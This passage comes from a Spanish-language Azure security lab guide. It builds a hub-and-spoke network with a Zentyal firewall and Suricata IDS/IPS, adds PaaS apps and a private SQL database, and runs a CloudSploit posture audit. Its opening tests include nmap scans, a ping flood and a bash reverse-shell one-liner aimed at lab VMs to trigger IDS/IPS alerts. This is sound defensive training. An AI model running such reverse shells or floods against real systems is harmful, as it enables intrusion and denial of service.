sudo nmap -A --top-ports 100 <IP_PRIVADA_VM_SPOKE2>
```
Esperado en `fast.log`: alertas `ET SCAN ...`.

### Prueba 3 – Salida a Internet (verificar NAT)
```bash
nslookup www.microsoft.com
curl -I https://www.microsoft.com
sudo nmap -sV --top-ports 10 scanme.nmap.org
```

### Prueba 4 – Shell inversa con netcat (detección IPS)
```bash
# VM-Spoke2 (listener)
nc -lvp 4444
# VM-Spoke1 (víctima) — netcat-openbsd no trae -e; usar bash:
bash -i >& /dev/tcp/<IP_PRIVADA_VM_SPOKE2>/4444 0>&1
```
IDS → alerta; IPS → conexión bloqueada.

### Prueba 5 – Flood ICMP (DoS)
```bash
sudo ping -f -c 1000 <IP_PRIVADA_VM_SPOKE2>
```

### Prueba 6 – Analizar alertas
```bash
sudo tail -50 /var/log/suricata/fast.log
sudo grep -i 'scan\|SCAN'                 /var/log/suricata/fast.log | tail -20
sudo grep -i 'shellcode\|netcat\|policy'  /var/log/suricata/fast.log | tail -20
sudo grep -i 'dos\|flood'                 /var/log/suricata/fast.log | tail -20
```

✅ **Fin de la Parte I.** Ya tienes la arquitectura Hub & Spoke con Zentyal operativa. Continúa con la Parte II para desplegar la aplicación PaaS.

---

# PARTE II – APLICACIÓN PAAS SOBRE LA ARQUITECTURA

En esta parte asignamos roles a los spokes: **Spoke1 = tier de APLICACIÓN** (App Service + Function App) y **Spoke2 = tier de DATOS** (Azure SQL). Como las UDR del Paso 10 fuerzan el tráfico inter-spoke por Zentyal, la comunicación **app → BD atraviesa el firewall**: microsegmentación real entre capas.

## Arquitectura objetivo de la Parte II

```
                      +----------------+
                      |    HUB-VNet    |
                      |   FW-Zentyal   |  (firewall + IDS/IPS Suricata)
                      +----------------+
                        /            \
              peering  /              \  peering
     +-------------------------+   +-----------------------------+
     |  Spoke1-VNet (APP)      |   |  Spoke2-VNet (DATOS)        |
     |  10.1.0.0/16            |   |  10.2.0.0/16                |
     |  WorkloadSubnet         |   |  WorkloadSubnet             |
     |    10.1.0.0/24 (VM)     |   |    10.2.0.0/24 (VM)         |
     |  AppIntegrationSubnet   |   |  PrivateEndpointSubnet      |
     |    10.1.1.0/24          |   |    10.2.1.0/24              |
     |    (deleg Microsoft.Web)|   |    - PE → Azure SQL         |
     |    - App Service        |   |  Azure SQL Database         |
     |    - Function App        |   |    (public access DISABLED) |
     +-------------------------+   +-----------------------------+

  Flujo app→BD:  App Service --VNet integration--> UDR 10.2.0.0/16 → Zentyal
                 --> FW-Zentyal (inspección) --> Private Endpoint SQL --> Azure SQL
  Autenticación: Microsoft Entra (managed identity), SIN contraseñas.
  DNS:           zona privada privatelink.database.windows.net
```

## Variables de trabajo

Ejecuta en **Azure Cloud Shell (Bash)** o Azure CLI autenticado:

```bash
# --- Contexto base (coincide con la Parte I) ---
export RG="RG-Networking"
export LOC="eastus"
export HUB_VNET="Hub-VNet"
export SPOKE1="Spoke1-VNet"      # tier aplicación
export SPOKE2="Spoke2-VNet"      # tier datos

# --- Nombres nuevos (los que deben ser únicos globalmente van marcados) ---
export INI="<iniciales>"                        # ej. mavr
export APP_PLAN="plan-app-$INI"
export WEBAPP="app-web-$INI"                     # App Service (único global)
export FUNCAPP="app-func-$INI"                   # Function App (único global)
export FUNC_SA="stfunc$INI"                      # storage Function (único global, minúsculas)
export SQL_SRV="sqlsrv-$INI"                     # servidor SQL (único global)
export SQL_DB="appdb"
export SQL_ADMIN="sqladminlab"
export SQL_ADMIN_PWD="<ContraseñaSegura#2026>"   # solo arranque; luego Entra
export KV="kv-s2-$INI"                           # Key Vault (opcional, único global)

# --- Subredes nuevas ---
export APP_SUBNET="AppIntegrationSubnet"         # Spoke1, delegada a Microsoft.Web
export PE_SUBNET="PrivateEndpointSubnet"         # Spoke2, para el private endpoint

# --- Next-hop del firewall (IP privada NIC Front de Zentyal) ---
export FW_FRONT_IP=$(az network nic show -g $RG -n fw-nic-front \
  --query "ipConfigurations[0].privateIPAddress" -o tsv)
echo "Firewall next-hop: $FW_FRONT_IP"

# --- Identidad ---
export SUB_ID=$(az account show --query id -o tsv)
export TENANT_ID=$(az account show --query tenantId -o tsv)
echo "Subscription: $SUB_ID  Tenant: $TENANT_ID"
```

> Los nombres de App Service, Function App, servidor SQL y storage deben ser **únicos a nivel global**. Si un comando falla por nombre en uso, agrega un sufijo.

## Paso 13 – Preparar la red para cargas PaaS

### 13.1 – Subred delegada en Spoke1 (integración de la app)
```bash
az network vnet subnet create \
  --resource-group $RG --vnet-name $SPOKE1 --name $APP_SUBNET \
  --address-prefix 10.1.1.0/24 \
  --delegations Microsoft.Web/serverFarms
```

### 13.2 – Subred de private endpoint en Spoke2 (datos)
```bash
az network vnet subnet create \
  --resource-group $RG --vnet-name $SPOKE2 --name $PE_SUBNET \
  --address-prefix 10.2.1.0/24

az network vnet subnet update \
  --resource-group $RG --vnet-name $SPOKE2 --name $PE_SUBNET \
  --private-endpoint-network-policies Disabled
```

### 13.3 – Forzar el egreso de la app por Zentyal (UDR en la subred delegada)
```bash
az network vnet subnet update \
  --resource-group $RG --vnet-name $SPOKE1 --name $APP_SUBNET \
  --route-table RT-Spoke1
```
> `RT-Spoke1` ya contiene `0.0.0.0/0 → Zentyal` y `10.2.0.0/16 → Zentyal`. Con la app integrada aquí y `vnetRouteAll` activo (Paso 15), el tráfico app→BD pasa por el firewall.

### 13.4 – Zona DNS privada de Azure SQL enlazada a las VNets
```bash
az network private-dns zone create \
  --resource-group $RG --name "privatelink.database.windows.net"

for VNET in $HUB_VNET $SPOKE1 $SPOKE2; do
  az network private-dns link vnet create \
    --resource-group $RG --zone-name "privatelink.database.windows.net" \
    --name "link-$VNET" --virtual-network $VNET --registration-enabled false
done
```

## Paso 14 – Desplegar la base de datos (tier de datos, Spoke2)

### 14.1 – Servidor y base de datos Azure SQL
```bash
az sql server create \
  --resource-group $RG --name $SQL_SRV --location $LOC \
  --admin-user $SQL_ADMIN --admin-password "$SQL_ADMIN_PWD"

az sql db create \
  --resource-group $RG --server $SQL_SRV --name $SQL_DB \
  --edition GeneralPurpose --compute-model Serverless \
  --family Gen5 --capacity 1 --backup-storage-redundancy Local
```

### 14.2 – Deshabilitar acceso público (mínima exposición)
```bash
az sql server update --resource-group $RG --name $SQL_SRV --set publicNetworkAccess="Disabled"
```
> El servidor deja de ser alcanzable desde Internet y desde cualquier VNet hasta que exista un private endpoint.

### 14.3 – Private endpoint de SQL en Spoke2
```bash
SQL_ID=$(az sql server show -g $RG -n $SQL_SRV --query id -o tsv)

az network private-endpoint create \
  --resource-group $RG --name "pe-sql-$INI" \
  --vnet-name $SPOKE2 --subnet $PE_SUBNET \
  --private-connection-resource-id $SQL_ID \
  --group-id sqlServer --connection-name "conn-sql-$INI"
```

### 14.4 – Integrar el PE con la zona DNS privada
```bash
az network private-endpoint dns-zone-group create \
  --resource-group $RG --endpoint-name "pe-sql-$INI" --name "zg-sql" \
  --private-dns-zone "privatelink.database.windows.net" \
  --zone-name "privatelink.database.windows.net"

# Verificar la IP privada del PE
az network private-endpoint show -g $RG -n "pe-sql-$INI" --query "customDnsConfigs" -o jsonc
```

### 14.5 – Autenticación con Microsoft Entra (sin contraseñas)
```bash
MY_UPN=$(az account show --query user.name -o tsv)
MY_OID=$(az ad signed-in-user show --query id -o tsv)

az sql server ad-admin create \
  --resource-group $RG --server-name $SQL_SRV \
  --display-name "$MY_UPN" --object-id "$MY_OID"
```

## Paso 15 – Desplegar App Service y Function App (tier de aplicación, Spoke1)

### 15.1 – App Service Plan (nivel con VNet integration)
```bash
# Standard S1: Basic NO soporta VNet integration.
az appservice plan create \
  --resource-group $RG --name $APP_PLAN --location $LOC --is-linux --sku S1
```

### 15.2 – App Service (web) con identidad administrada y hardening
```bash
az webapp create \
  --resource-group $RG --plan $APP_PLAN --name $WEBAPP \
  --runtime "NODE:20-lts" --tags costCenter=SecOps201 tier=app

az webapp identity assign --resource-group $RG --name $WEBAPP

az webapp update  --resource-group $RG --name $WEBAPP --set httpsOnly=true
az webapp config set --resource-group $RG --name $WEBAPP --ftps-state Disabled --min-tls-version 1.2
```

### 15.3 – Integrar el App Service a la subred delegada de Spoke1
```bash
az webapp vnet-integration add \
  --resource-group $RG --name $WEBAPP --vnet $SPOKE1 --subnet $APP_SUBNET

# Forzar TODO el egreso por la VNet (y por ende por Zentyal)
az webapp config set --resource-group $RG --name $WEBAPP \
  --generic-configurations '{"vnetRouteAllEnabled": true}'
```

### 15.4 – Function App en el mismo plan Dedicated con VNet integration
```bash
# Storage de respaldo requerido por Functions
az storage account create \
  --resource-group $RG --name $FUNC_SA --location $LOC \
  --sku Standard_LRS --min-tls-version TLS1_2 --allow-blob-public-access false

# Function App en el plan Dedicated (S1)
az functionapp create \
  --resource-group $RG --name $FUNCAPP --plan $APP_PLAN \
  --storage-account $FUNC_SA --functions-version 4 \
  --runtime node --runtime-version 20 --os-type Linux \
  --tags costCenter=SecOps201 tier=app

az functionapp identity assign --resource-group $RG --name $FUNCAPP
az functionapp update  --resource-group $RG --name $FUNCAPP --set httpsOnly=true
az functionapp config set --resource-group $RG --name $FUNCAPP --ftps-state Disabled --min-tls-version 1.2

az functionapp vnet-integration add \
  --resource-group $RG --name $FUNCAPP --vnet $SPOKE1 --subnet $APP_SUBNET
az functionapp config set --resource-group $RG --name $FUNCAPP \
  --generic-configurations '{"vnetRouteAllEnabled": true}'
```
> Las Function App en plan **Consumption** no soportan VNet integration; por eso usamos el plan Dedicated (S1). App y Function comparten la subred delegada (válido para el lab).

## Paso 16 – Conectar la aplicación a la BD a través de la arquitectura

### 16.1 – Permitir app→BD en el firewall Zentyal
En **Firewall → Packet Filter → Filtering rules for traffic coming from internal networks**, agrega **antes** del `Deny-All`:

| Nombre | Origen | Destino | Protocolo | Puerto | Acción |
|---|---|---|---|---|---|
| Allow-App-to-SQL | 10.1.0.0/16 | 10.2.1.0/24 | TCP | 1433 | **Allow** |

Save Changes → Apply. Verifica: `sudo iptables -S | grep 1433`.

### 16.2 – Usuario de la BD para la identidad de la app (Entra, sin contraseñas)
Conéctate a la BD como **admin Entra** (por ejemplo con `sqlcmd` desde `VM-Spoke2`, que tiene línea de visión al private endpoint) y ejecuta:

```sql
CREATE USER [app-web-<iniciales>]  FROM EXTERNAL PROVIDER;
ALTER ROLE db_datareader ADD MEMBER [app-web-<iniciales>];
ALTER ROLE db_datawriter ADD MEMBER [app-web-<iniciales>];

CREATE USER [app-func-<iniciales>] FROM EXTERNAL PROVIDER;
ALTER ROLE db_datareader ADD MEMBER [app-func-<iniciales>];
ALTER ROLE db_datawriter ADD MEMBER [app-func-<iniciales>];
```
> **Secretless:** la app nunca almacena usuario/contraseña de la BD; se autentica con su identidad administrada.

### 16.3 – Cadena de conexión sin secreto
```bash
SQL_FQDN="$SQL_SRV.database.windows.net"
CONN="Server=tcp:$SQL_FQDN,1433;Database=$SQL_DB;Authentication=Active Directory Managed Identity;Encrypt=True;"

az webapp config appsettings set --resource-group $RG --name $WEBAPP --settings SQL_CONNECTION="$CONN"
az functionapp config appsettings set --resource-group $RG --name $FUNCAPP --settings SQL_CONNECTION="$CONN"
```
> **Opción Key Vault (refuerza la Sesión 1):** guarda la cadena en `kv-s2-<ini>` y referénciala con `@Microsoft.KeyVault(SecretUri=...)`, otorgando *Key Vault Secrets User* a la identidad de la app.

### 16.4 – (Opcional) Código de prueba
```js
// index.js (conceptual) — usa Managed Identity, sin secretos
const sql = require('mssql');
module.exports = async function (context, req) {
  await sql.connect(process.env.SQL_CONNECTION);
  const r = await sql.query`SELECT SUSER_SNAME() AS usuario, GETDATE() AS hora`;
  context.res = { body: r.recordset };
};
```

## Paso 17 – Validación de la microsegmentación (Zentyal + Network Watcher)

### 17.1 – Resolución DNS privada desde la app
En **App Service `app-web-<ini>` → Development Tools → SSH → Go**:
```bash
# Debe resolver a IP privada 10.2.1.x (el PE), NO a IP pública
nslookup sqlsrv-<iniciales>.database.windows.net

# Prueba de puerto 1433 (vía VNet → Zentyal → PE)
timeout 5 bash -c "cat < /dev/null > /dev/tcp/sqlsrv-<iniciales>.database.windows.net/1433" \
  && echo "TCP 1433 ALCANZABLE (vía Zentyal)" || echo "sin ruta / bloqueado"
```

### 17.2 – Confirmar el paso por Zentyal
En `FW-Zentyal` (SSH), mientras generas tráfico:
```bash
sudo tail -f /var/log/suricata/fast.log
sudo conntrack -L 2>/dev/null | grep 1433
sudo iptables -S | grep 1433
```
**Prueba negativa:** deshabilita la regla `Allow-App-to-SQL` (o súbela por debajo del `Deny-All`), aplica, y repite 17.1: ahora debe **fallar**. Esto demuestra que el firewall del hub controla la comunicación entre capas.

### 17.3 – Rutas con Network Watcher
```bash
az network watcher show-next-hop \
  --resource-group $RG --vm VM-Spoke1 --nic 0 \
  --source-ip 10.1.0.4 --dest-ip 10.2.1.4 -o table
```
**Esperado:** `NextHopType = VirtualAppliance`, `NextHopIpAddress = $FW_FRONT_IP`.

---

# PARTE III – CSPM CON CLOUDSPLOIT

## Paso 18 – CSPM con CloudSploit desde Azure Cloud Shell

Auditamos la postura de seguridad de toda la suscripción — **incluida la arquitectura recién construida** — con **CloudSploit** (Aqua), desde **Azure Cloud Shell**.

### 18.1 – Service principal de solo lectura (menor privilegio)
```bash
# App Registration + SP con rol de lectura de seguridad sobre la suscripción
az ad sp create-for-rbac \
  --name "CloudSploit-SecOps-$INI" \
  --role "Security Reader" \
  --scopes "/subscriptions/$SUB_ID"
# --- Copia del OUTPUT: appId, password, tenant ---

# Segundo rol de lectura (reemplaza <APP_ID>)
SP_APPID="<APP_ID>"
az role assignment create --assignee "$SP_APPID" \
  --role "Log Analytics Reader" --scope "/subscriptions/$SUB_ID"
```
> El escáner solo **lee** la configuración; no puede modificar ni borrar nada.

### 18.2 – Instalar CloudSploit (Cloud Shell ya trae Node.js y git)
```bash
cd ~
git clone https://github.com/aquasecurity/cloudsploit.git
cd cloudsploit
npm install
```

### 18.3 – Configurar credenciales
```bash
cp config_example.js config.js

cat > azure_credentials.json <<EOF
{
  "ApplicationID": "<APP_ID>",
  "KeyValue": "<PASSWORD>",
  "DirectoryID": "$TENANT_ID",
  "SubscriptionID": "$SUB_ID"
}
EOF

# En config.js, dentro del bloque azure: {...}, descomenta y ajusta:
#   credential_file: '/home/<usuario>/cloudsploit/azure_credentials.json',
nano config.js
```
> Alternativa: descomenta el bloque `azure` con `process.env.*` y exporta `AZURE_APPLICATION_ID`, `AZURE_KEY_VALUE`, `AZURE_DIRECTORY_ID`, `AZURE_SUBSCRIPTION_ID`.

### 18.4 – Ejecutar el escaneo
```bash
# Completo, ignorando OK, en tabla
node index.js --config ./config.js --console=table --ignore-ok

# Mapeado a CIS Benchmark
node index.js --config ./config.js --compliance=cis --console=table --ignore-ok

# Exportar para el entregable
node index.js --config ./config.js --csv=hallazgos.csv --json=hallazgos.json --console=none
```
Descarga los reportes desde **Manage files → Download** (`cloudsploit/hallazgos.csv`).

### 18.5 – Análisis dirigido a la arquitectura desplegada

| Hallazgo típico de CloudSploit | ¿Riesgo real o esperado en el lab? |
|---|---|
| VM con IP pública (`FW-Zentyal`) | Necesario para administrar el NVA; en prod → Bastion |
| Puerto SSH (22) abierto desde `*` en NSG | Endurecer a IP de administración |
| Puerto 8443 (webadmin Zentyal) expuesto | Restringir origen |
| SQL Server sin auditing / sin TDE explícito | Revisar y habilitar |
| App Service sin `httpsOnly` / TLS bajo | Ya remediado en Paso 15 (verificar) |
| Storage de la Function con acceso público | Ya deshabilitado (verificar) |
| Ausencia de logging/monitoreo | Proponer Defender for Cloud / Sentinel |

**Preguntas de verificación:**
- ¿Qué hallazgos se solapan con lo que ya endureciste (HTTPS, TLS, acceso público del storage)? ¿Cuáles son nuevos?
- Los hallazgos de mala configuración corresponden a **A05 Security Misconfiguration** del OWASP Top 10 — ¿cuáles priorizarías por riesgo?
- ¿En qué se diferencia **CloudSploit** (agente externo con SP de solo lectura) de **Defender for Cloud** (nativo) y **Prowler** (Sesión 1)? ¿Por qué usar varios?

> **Cierre del ciclo:** la misma arquitectura es a la vez **la defensa** (Zentyal, private endpoints, managed identity) y **el objeto auditado** (CloudSploit): construir seguro y verificar que quedó seguro.

---

# CIERRE

## Validación avanzada – Azure Network Watcher

### Rutas efectivas (Effective Routes)
```bash
NIC1_ID=$(az vm show -g RG-Networking -n VM-Spoke1 --query "networkProfile.networkInterfaces[0].id" -o tsv)
az network nic show-effective-route-table --ids $NIC1_ID -o table
```
Verificar: `0.0.0.0/0`, `10.2.0.0/16` (desde Spoke1) y `10.1.0.0/16` (desde Spoke2) con `nextHopType: VirtualAppliance`.

### Next Hop
```bash
az network watcher show-next-hop \
  --resource-group RG-Networking --vm VM-Spoke1 --nic 0 \
  --source-ip 10.1.0.4 --dest-ip 13.107.21.200 -o table
```
**Esperado:** `NextHopType = VirtualAppliance`, `NextHopIpAddress = $FW_FRONT_IP`.

### Connection Troubleshoot (portal)
**Network Watcher → Connection Troubleshoot**: Source `VM-Spoke1`, Destination IP privada de `VM-Spoke2` o `www.microsoft.com`, Protocol TCP, puerto 22/443. Esperado: `Status = Reachable` con hop por `FW-Zentyal`.

### NSG efectivas
```bash
az network nic list-effective-nsg --resource-group RG-Networking --name <NIC_NAME_VM_SPOKE1> -o table
```

## Limpieza de recursos

```bash
# 1. Eliminar el service principal de CloudSploit
az ad sp delete --id "$SP_APPID"

# 2. Eliminar TODO el grupo de recursos del laboratorio (incluye la arquitectura base)
az group delete --name RG-Networking --yes --no-wait
```
Para conservar la arquitectura base y borrar **solo** lo de la Parte II: elimina `pe-sql-$INI`, `$SQL_SRV`, `$WEBAPP`, `$FUNCAPP`, `$FUNC_SA`, `$APP_PLAN`, la zona DNS privada y las subredes `AppIntegrationSubnet` y `PrivateEndpointSubnet`.

## Solución de problemas frecuentes

| Síntoma | Causa probable | Solución |
|---|---|---|
| Interfaces no usan `eth` | Ubuntu 24.04 usa nombres predictivos | Bloque GRUB del Paso 7.2.1 y reiniciar |
| El instalador Zentyal aborta | Paquetes pendientes / puerto 8443 en uso | `apt dist-upgrade -y`, revisar prerequisitos del Paso 7.3 |
| Spoke-to-Spoke no cruza Zentyal | Peering sin *forwarded traffic* o UDR ausente | Revisar Pasos 5 y 10 |
| `nslookup` de la BD devuelve IP pública | Zona DNS privada no enlazada a la VNet de la app | Revisar Paso 13.4 |
| App no conecta a la BD (timeout) | Falta `Allow-App-to-SQL` o `vnetRouteAll` desactivado | Revisar Pasos 16.1 y 15.3 |
| `Login failed for user '<token-identified principal>'` | Usuario Entra de la identidad no existe en la BD | Ejecutar el T-SQL del Paso 16.2 |
| `az webapp vnet-integration add` falla | Plan Basic o subred no delegada/no vacía | Usar S1+ y subred delegada a `Microsoft.Web/serverFarms` |
| Private endpoint no aprueba | Permisos insuficientes sobre el servidor SQL | Ejecutar con Owner/Contributor sobre `RG-Networking` |
| CloudSploit: `insufficient privileges` | Faltan roles de lectura | Confirmar `Security Reader` + `Log Analytics Reader` |
| CloudSploit no arranca en Cloud Shell | `npm install` incompleto | Reintentar dentro de `~/cloudsploit` |

## Checklist de finalización

**Parte I – Arquitectura base**
- [ ] VNet Hub (`10.0.0.0/16`) con `Subnet-Front` y `Subnet-Back`.
- [ ] `Spoke1-VNet` (`10.1.0.0/16`) y `Spoke2-VNet` (`10.2.0.0/16`) con `WorkloadSubnet`.
- [ ] VM `FW-Zentyal` dual-NIC con IP forwarding (Azure y SO).
- [ ] Zentyal accesible en `https://<IP>:8443`; interfaces `eth0` External / `eth1` Internal.
- [ ] NAT/Masquerade activo; reglas de firewall con `Deny-All` final.
- [ ] IDS/IPS (Suricata) con rulesets `emerging-scan/exploit/shellcode/dos`.
- [ ] VNet Peering con forwarded traffic; UDRs (next-hop = `$FW_FRONT_IP`).
- [ ] NSG por subred aplicados; `nmap`/`netcat` en las VMs Spoke.
- [ ] Pruebas nmap y netcat detectadas en `/var/log/suricata/fast.log`.

**Parte II – Aplicación PaaS**
- [ ] Subred delegada `AppIntegrationSubnet` (10.1.1.0/24) en Spoke1 con `RT-Spoke1`.
- [ ] Subred `PrivateEndpointSubnet` (10.2.1.0/24) en Spoke2, network policies off.
- [ ] Zona DNS `privatelink.database.windows.net` enlazada a Hub, Spoke1 y Spoke2.
- [ ] Azure SQL con `publicNetworkAccess=Disabled` y admin Entra.
- [ ] Private endpoint de SQL en Spoke2 integrado con la zona DNS.
- [ ] App Service (S1) con managed identity, `httpsOnly`, TLS 1.2, VNet integration + `vnetRouteAll`.
- [ ] Function App en plan Dedicated con managed identity y VNet integration.
- [ ] Regla `Allow-App-to-SQL` (1433) antes del `Deny-All` en Zentyal.
- [ ] Usuarios Entra de las apps creados en la BD (secretless).
- [ ] `nslookup` de la BD resuelve a 10.2.1.x desde la consola de la app.
- [ ] Next hop hacia la BD = `VirtualAppliance` en Network Watcher.
- [ ] Prueba negativa: sin la regla del firewall, la app NO alcanza la BD.

**Parte III – CloudSploit**
- [ ] SP `CloudSploit-SecOps` con `Security Reader` + `Log Analytics Reader`.
- [ ] CloudSploit instalado y ejecutado desde Cloud Shell; `hallazgos.csv` generado.
- [ ] Análisis de hallazgos de la arquitectura documentado.

## Referencias

- Guía base (Cloud-Lab): https://github.com/malevarro/Cloud-Lab/blob/main/Lab_HubSpoke_Zentyal.md
- Hub-spoke network topology: https://learn.microsoft.com/azure/architecture/networking/architecture/hub-spoke
- Azure Network Watcher – Next hop: https://learn.microsoft.com/azure/network-watcher/diagnose-vm-network-routing-problem
- Zentyal 8.1 – instalación: https://doc.zentyal.org/es/installation.html
- Script instalador (Cloud-Lab): https://github.com/malevarro/Cloud-Lab/blob/main/Firewall/zentyal_installer_8.1.sh
- Suricata IDS/IPS: https://suricata.io/documentation/
- Emerging Threats Open Ruleset: https://rules.emergingthreats.net/
- Enable VNet integration en App Service: https://learn.microsoft.com/azure/app-service/configure-vnet-integration-enable
- `az webapp vnet-integration add`: https://learn.microsoft.com/cli/azure/webapp/vnet-integration
- Private endpoint (CLI): https://learn.microsoft.com/azure/private-link/create-private-endpoint-cli
- Azure SQL + Private Link: https://learn.microsoft.com/azure/azure-sql/database/private-endpoint-overview
- Managed identity con Azure SQL: https://learn.microsoft.com/azure/azure-sql/database/authentication-aad-overview
- CloudSploit (Aqua): https://github.com/aquasecurity/cloudsploit
- CloudSploit – configuración de Azure: https://github.com/aquasecurity/cloudsploit/blob/master/docs/azure.md
- Azure Cloud Shell: https://learn.microsoft.com/azure/cloud-shell/overview
